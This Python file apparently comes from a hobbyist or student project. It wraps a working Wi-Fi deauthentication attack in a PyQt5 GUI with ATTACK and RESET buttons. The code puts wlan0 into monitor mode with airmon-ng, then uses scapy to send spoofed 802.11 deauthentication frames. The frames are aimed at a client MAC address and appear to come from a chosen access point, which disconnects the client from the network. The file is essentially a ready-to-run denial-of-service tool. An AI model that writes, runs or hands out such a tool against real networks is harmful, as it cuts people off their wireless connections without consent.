import sys
from PyQt5.QtWidgets import QMainWindow, QApplication,QPushButton,QLineEdit, QTextEdit, QLabel
from PyQt5 import QtGui
from PyQt5.QtCore import pyqtSlot
import time
from scapy.all import *
from subprocess import call
from subprocess import check_output
import re
import threading


iface = "wlan0mon"
timeout = 1
#dest = "94:65:2D:D8:2E:16"
#bssid = "40:F2:01:9A:42:56"

resetflag = False
packetcount = 1

def setMonitorMode():
	checkphrase_mon_success = "monitor mode vif enabled"
	checkphrase_mon = "Mode:Monitor"

	moncheck = check_output(["iwconfig"],stderr=subprocess.PIPE).decode("UTF-8") #stderr=subprocess.PIPE simply "silences" the output.

	if checkphrase_mon in moncheck:
		print("wlan0mon is already in Monitor Mode!")

	else:
		airmoncheck = check_output(["airmon-ng", "start", "wlan0"],stderr=subprocess.PIPE).decode("UTF-8")
		if checkphrase_mon_success in airmoncheck:
			print("Sucessfully set wlan0 to Monitor Mode (now called wlan0mon)!")
		else:
			raise SystemExit("wlan0 has not entered Monitor Mode, recheck.")




def perform_deauth_attack(interface,dest,bssid,amount):
	"""
	interface, is the wireless interface
	destination is the target we wish to deuath
	bssid is the mac address of the AP. (string, MAC)

	:param interface:
	:param dest:
	:param bssid:
	:return:
	"""
	global packetcount #ville gerne bare kunne returne packet count af funktionen aka. i værdien, i forloopet, men problemet er at den er nødt til at køre som en Thread.
	radio_p = RadioTap()
	dot11_frame = Dot11(subtype=0xc,addr1=dest,addr2=bssid,addr3=bssid) #0xc is hex for 12, and 1100 in integer (deuath sub type value)
	deauth = Dot11Deauth(reason=3) #reason list, see 802.11 deauth reason codes,
	# https://community.cisco.com/t5/wireless-mobility-documents/802-11-association-status-802-11-deauth-reason-codes/ta-p/3148055
	frame = radio_p/dot11_frame/deauth

	#hexdump(frame)
	#ls(frame)
	#frame.summary()


	#sendp(frame,iface=interface, count=amount,inter=0.1,verbose=False) #'wlan0mon' - set verbose true if you want to see packet output amount.
	#print(end-start) #takes about 3.6 seconds to send 1000 packets at a speed of 0.0001
	#sendpfast(frame,iface=interface,pps=1000,loop=amount,parse_results=1)

	#sendp(frame, iface=interface, count=amount,inter=0.2,verbose=False)
	#endTOTAL = time.time()
	#print(endTOTAL - startTOTAL)

	attack_timer = time.time()

	for i in range(0,amount):
		if resetflag == True:
			#print("RESET BUTTON CLICKED")
			#return "RESET BUTTON CLICKED"
			break
		else:
			#start = time.time()
			sendp(frame,iface=interface,verbose=False)
			#end = time.time()
			#print(end - start)
			packetcount +=1

	end_attack_timer = time.time()
	total_attack_time = (end_attack_timer - attack_timer)
	print("TOTAL TIME SPENT ON PACKETS SENT")
	print(total_attack_time)
	print("TOTAL PACKETS SENT: ")
	print(packetcount)

	#endTOTAL = time.time()
	#print(endTOTAL - startTOTAL)  # takes about 40 seconds to send 1000 deuath packets in a for loop.



setMonitorMode()
#perform_deauth_attack(iface,dest,bssid,1)
class App(QMainWindow):
	def __init__(self):
		super().__init__()
		self.title = "DeAuthentication Attack"
		self.setupUI()

	def setupUI(self):
		self.setWindowTitle(self.title)
		self.setGeometry(50,50,700,700)


		#MAC AP
		self.textboxAP = QLineEdit(self)
		self.textboxAP.setPlaceholderText("Enter the target AP MAC address")
		self.textboxAP.move(20,40)
		self.textboxAP.resize(280, 40)
		#MAC TARGET
		self.textbox = QLineEdit(self)
		self.textbox.setPlaceholderText("Enter the target MAC address")
		self.textbox.move(20,100)
		self.textbox.resize(280,40)


		##ATTACK button
		self.attackbutton = QPushButton('ATTACK',self)
		self.attackbutton.resize(200,50)
		self.attackbutton.move(350,30)
		self.attackbutton.clicked.connect(self.on_attackclick)

		##RESET BUTTON
		self.resetbutton = QPushButton('RESET',self)
		self.resetbutton.resize(200,50)
		self.resetbutton.move(350,100)
		self.resetbutton.clicked.connect(self.on_resetclick)


		self.show()



	@pyqtSlot()
	def on_attackclick(self):
		global resetflag
		resetflag = False

		self.textboxAP.setEnabled(False)
		self.textbox.setEnabled(False)
		bssid_targetMAC = self.textboxAP.text() #string
		destMAC = self.textbox.text() #string
		print(bssid_targetMAC)
		print(destMAC)
		matchexpr = "[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$" #regex match
		if re.match(matchexpr, bssid_targetMAC.lower()) and re.match(matchexpr,destMAC.lower()):#checks if both inputs are valid MAC addreses (just format)

			attackthread = threading.Thread(target=perform_deauth_attack, args=(iface,destMAC, bssid_targetMAC, 100))
			attackthread.start()





		else:
			self.textboxAP.setPlaceholderText("Enter valid AP MAC address")
			self.textbox.setPlaceholderText("Enter valid destination MAC address")
			self.textboxAP.setEnabled(True)
			self.textbox.setEnabled(True)
			self.textbox.clear()
			self.textboxAP.clear()


	@pyqtSlot()
	def on_resetclick(self):
		global resetflag
		global packetcount
		self.textbox.clear()
		self.textboxAP.clear()
		self.textboxAP.setEnabled(True)
		self.textbox.setEnabled(True)
		self.textboxAP.setPlaceholderText("Enter the target AP MAC address")
		self.textbox.setPlaceholderText("Enter the target MAC address")
		resetflag = True
		packetcount = 0




if __name__ == '__main__':
	app = QApplication(sys.argv)
	ex = App()
	sys.exit(app.exec_())
